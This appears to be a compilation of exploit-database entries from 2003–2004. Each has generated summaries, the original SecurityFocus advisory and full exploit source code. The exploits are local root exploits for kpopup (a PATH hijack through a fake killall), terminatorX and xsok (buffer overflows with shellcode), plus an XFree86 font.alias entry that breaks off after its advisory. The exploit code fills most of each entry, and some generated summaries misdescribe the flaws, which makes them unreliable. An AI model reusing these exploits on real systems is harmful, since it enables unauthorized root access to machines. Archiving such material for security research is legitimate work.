// #<-- Publish Date --># // 2003-10-28 // #<-- Technical Document Summary (TDS) --># // The exploit leverages an insecure use of the system(3) C-library function by a setuid root binary to execute arbitrary commands. The vulnerability stems from kpopup invoking system() without proper privilege checks, allowing an attacker to run killall(1) and obtain a root shell. Affected component: kpopup (setuid root), vulnerability: insecure system call leading to command execution. No successful exploitation is confirmed in the source. // #<-- Layman's Document Summary (LDS) --># // A local attacker can gain root privileges by using a setuid program that calls system() unsafely, enabling the execution of another executable specified via the PATH environment variable. This allows an arbitrary binary to run with the privileges of the process invoking it. // #<-- Key Words (KW) --># // kpopup, privileged command execution, setuid root, system(3), PATH environment variable, killall(1), root shell // #<-- Related Terms --># // setuid, command injection, privilege escalation, local exploit, insecure function call, root privilege, exploit development // #<-- Entities/Attributes --># // Software: kpopup, version: 0.9.x; Vulnerability: Path traversal via system(); OS: Linux; Function: setuid, setgid, execve; File path: /tmp/killall; Command: chmod, chown // #<-- Vulnerability Type --># // Not specified in source // #<-- Original Content --># // source: https://www.securityfocus.com/bid/8915/info It has been alleged that it is possible for local attackers to gain root privileges through kpopup, which is is installed setuid root by default. According to the report, kpopup uses the system(3) C-library function insecurely to run other utilities on the system. In at least one instance, system(3) is called to invoke the binary killall(1) in a manner relying on the PATH environment variable. As the environment can be set by the unprivileged user when kpopup is executed, an arbitrary executable with the filename killall(1) can be executed. Many modern shells anticipate insecure use of this function by setuid/setgid processes and drop effective privileges if they do not match the real userid/gid of the process. It may be the case that kpopup first sets its real uid and gid to 0 before calling system, making this vulnerability exploitable. This has not been confirmed by Symantec. /*Local root exploit for kpopup *by b0f www.b0f.net */ #include <stdio.h> int main() { setenv("PATH=/tmp:/usr/kerberos/sbin:/usr/kerberos/bin:/usr/local/sbin:\ /usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/usr/X11R6/bin:/root/bin:"); FILE *fd; fd = fopen("/tmp/killall", "w");{ fprintf(fd, "#!/bin/sh
"); fprintf(fd, "cd /tmp
"); fprintf(fd, "/bin/cat > shell.c << EOF
"); fprintf(fd, "#include <stdio.h>
"); fprintf(fd, "int main()
"); fprintf(fd, "{
"); fprintf(fd, "setuid(0);
"); fprintf(fd, "setgid(0);
"); fprintf(fd, "execl("/bin/bash", "-bash", NULL);
"); fprintf(fd, "return 0;
"); fprintf(fd, "}
"); fprintf(fd, "EOF
"); fprintf(fd, "/usr/bin/gcc /tmp/shell.c -o /tmp/shell
"); fprintf(fd, "/bin/chown root.root /tmp/shell
"); fprintf(fd, "/bin/chmod 6711 /tmp/shell
"); fprintf(fd, "echo NOW HERE IS YOUR ROOT SHELL
"); fprintf(fd, "/tmp/shell
"); fclose(fd); system("chmod +x /tmp/killall"); system("/usr/local/kde/bin/kpopup root shell"); return 0; } }

// #<-- Publish Date --># // 2003-11-07 // #<-- Technical Document Summary (TDS) --># // The program constructs a shellcode buffer by concatenating fixed byte sequences and then writes it to memory. It uses the return value of a system call as an offset to read a user‑supplied filename from the command line, then overwrites subsequent bytes with crafted shellcode that includes a function pointer to terminate execution. The vulnerability stems from improper handling of external input without proper sanitization, allowing arbitrary code execution when the application is run with elevated privileges. Affected component: TerminatorX v3.80; weakness: buffer overflow in command‑line argument processing; exploit performs local root privilege escalation via a shellcode injection. Not specified in source. // #<-- Layman's Document Summary (LDS) --># // The program takes user input and uses it as an offset into a fixed buffer, then writes its own code into that buffer, overwriting part of the executable. This allows an attacker to run any code after the vulnerable function finishes. Not specified in source. // #<-- Key Words (KW) --># // TerminatorX, shellcode injection, buffer overflow, command-line argument parsing, local root exploit, setuid, CVE, vulnerability, exploitation, Linux, binary, offset calculation, code reuse // #<-- Related Terms --># // root privilege escalation, shellcode, command line, environment variable handling, local exploit, TerminatorX, security focus, buffer overrun, Windows, operating system, vulnerability classification // #<-- Entities/Attributes --># // Software: TerminatorX version 3.8; Vulnerability: multiple command-line and environment buffer overruns; Attributed to: m00 Security / Over_G; No version specified in source. // #<-- Vulnerability Type --># // Not specified in source // #<-- Original Content --># // source: https://www.securityfocus.com/bid/8993/info It has been reported that TerminatorX may be prone to multiple vulnerabilities when handling command-line and environment variable data. As a result, an attacker may be capable of exploiting the application in a variety of ways to execute arbitrary code with elevated privileges. It should be noted that TerminatorX is not installed setuid by default, however the author recommends that users make the application setuid root. /******************************************************* * terminatorX v3.80 - local root exploit * by m00 Security / Over_G * * overg[at]mail.ru www.m00.ru * * Bugs discovered by c0wboy ********************************************************/ #include <stdio.h> #include <stdlib.h> char shellcode[] = "\x31\xdb\x89\xd8\xb0\x17\xcd\x80" "\x31\xdb\x89\xd8\xb0\x2e\xcd\x80" "\x31\xc0\x50\x68\x2f\x2f\x73\x68" "\x68\x2f\x62\x69\x6e\x89\xe3\x50" "\x53\x89\xe1\x31\xd2\xb0\x0b\xcd" "\x80\x31\xdb\x89\xd8\xb0\x01\xcd\x80"; unsigned long ret = 0xbffffaaa; int main(int argc, char ** argv) { int i,offset; char buffer[1266]; if(argv[1]) { offset=atoi(argv[1]); ret = ret - offset; } for (i=0; i < (259-strlen(shellcode));i++) buffer[i]=0x90; memcpy((buffer+259-strlen(shellcode)),shellcode,strlen(shellcode)); memcpy((buffer+259),"A",1); memcpy((buffer+260), (char*)&ret, 4); printf("
terminatorX v3.80 - local root exploit by m00 Security / Over_G
 www.m00.ru OverG[at]mail.ru

"); printf("Using ret: 0x%08x 
",ret); execl("/usr/local/bin/terminatorX","terminatorX","-f",buffer,NULL); }

// #<-- Publish Date --># // 2003-12-30 // #<-- Technical Document Summary (TDS) --># // The exploit leverages an insufficient bounds check on data supplied via the LANG environment variable to cause a locally exploitable buffer overrun. This vulnerability permits arbitrary code execution with elevated privileges. The affected component is the xsok utility, specifically its handling of the LANG variable. The program is installed as a setgid game. It calculates the return address automatically and improves shellcode delivery. Tested on Redhat Linux 9.0. Not specified in source. // #<-- Layman's Document Summary (LDS) --># // The weakness lies in a local buffer overflow caused by not validating the size of data read from the LANG environment variable. This flaw allows an attacker to execute arbitrary code with the privileges of the vulnerable process. The affected technology is the xsok local game binary on Linux systems. The exploit enables code execution without authentication. Not specified in source. // #<-- Key Words (KW) --># // xsok, buffer overflow, environment variable, setgid game, Redhat Linux 9.0, return address, shellcode, elevated privileges, local vulnerability, CVE-2004-0074, OSVDB-6879 // #<-- Related Terms --># // buffer overrun, local code execution, environment variable injection, setuid binary, RedHat Linux, exploit, return address manipulation, shellcode, operating system vulnerability, CVE identifier // #<-- Entities/Attributes --># // Product: xsok // Version: 1.02 // Author: n2n // Platform: Linux // Functions: setenv, fprintf, strlen, execl, execve // File path: /usr/X11R6/bin/xsok // CVE identifier: CVE-2004-0074 // #<-- Vulnerability Type --># // Not specified in source // #<-- Original Content --># // source: https://www.securityfocus.com/bid/9341/info xsok is prone to a locally exploitable buffer overrun vulnerability due to insufficient bounds check of data supplied through the LANG environment variable. This could be exploited to execute arbitrary code with elevated privileges. The program is typically installed setgid games. /* xsok 1.02 local game exploit coded by n2n, n2n<at>linuxmail.org Eye on Security Research Group, India http://www.eos-india.net This exploit calculates the return address automatically. Also the shellcode is improved and automatically gets the effective uid and gid of the vulnerable binary. Tested on Redhat Linux 9.0 */ #define VULN "/usr/X11R6/bin/xsok" #define BUFLEN 100 #include <string.h> #include <stdlib.h> #include <stdio.h> /* shellcode by me, n2n@linuxmail.org */ char *shellcode= /* setreuid(geteuid(),geteuid()), no use unless xsok is setuid, usually its only setgid games */ "\x31\xc0\xb0\x31\xcd\x80\x93\x89\xd9\x31\xc0\xb0\x46\xcd\x80" /* setregid(getegid(),getegid()) */ "\x31\xc0\xb0\x32\xcd\x80\x93\x89\xd9\x31\xc0\xb0\x47\xcd\x80" /* exec /bin/sh */ "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" /* exit() */ "\x31\xdb\x89\xd8\xb0\x01\xcd\x80"; int main(int argc, char **argv) { char exploit[BUFLEN+5]; unsigned long addr_ret = 0xc0000000 - 4; char *arg0 = VULN; int i; if (argc > 2) { fprintf(stderr, "Usage: %s [PROG]
", argv[0]); return 1; } if (argc > 1) arg0 = argv[1]; addr_ret -= strlen(arg0) + 1; addr_ret -= strlen(shellcode) + 1; setenv("EGG",shellcode,1); for(i=0;i<BUFLEN;i+=4) *(unsigned int *)(exploit+i)=addr_ret; exploit[i]=0x0; setenv("LANG",exploit,1); printf("Using RET=%p
",addr_ret); execl(arg0,arg0,NULL); printf("
"); return 1; }

// #<-- Publish Date --># // 2004-11-10 // #<-- Technical Document Summary (TDS) --># // The code contains a local buffer overflow caused by insufficient validation of the 'font.alias' file when parsing the 'setuidcode' and 'shellcode' arrays. Exploitation may allow an attacker to gain root privileges on the affected system. The vulnerability resides in the XFree86 library's handling of font alias data structures. The exploit injects shellcode into memory via crafted font files. Technical mechanism involves improper bounds checking leading to arbitrary code execution. Affected component: XFree86 graphics server library. // #<-- Layman's Document Summary (LDS) --># // The program has a weakness where it doesn't check the size of input data before writing to buffers, which could let an attacker crash or manipulate system behavior. An attacker can use this flaw to run commands with the privileges of the running process. It's a classic buffer overflow issue in the X11 windowing system library. // #<-- Key Words (KW) --># // buffer overflow, improper bounds checking, root privilege escalation, XFree86, font alias parsing, shellcode injection, local vulnerability // #<-- Related Terms --># // buffer overflow, improper input validation, root access, XFree86, font file parsing, shellcode injection, local buffer overflow // #<-- Entities/Attributes --># // Software: XFree86, Library: fonts, File paths: /tmp/fonts.dir, /tmp/fonts.alias, Code: setuidcode, shellcode, Protocols: none, CVE-2004-0083, OSVDB-3905 // #<-- Vulnerability Type --># // Not specified in source // #<-- Original Content --># // source: https://www.securityfocus.com/bid/9636/info It has been reported that the XFree86 X Windows system is prone to a local buffer overflow vulnerability. The issue arises from improper bounds checking when parsing the 'font.alias' file. Successful exploitation of this issue may allow an attacker to gain root privileges to the affected system. /* For educational purposes only */ 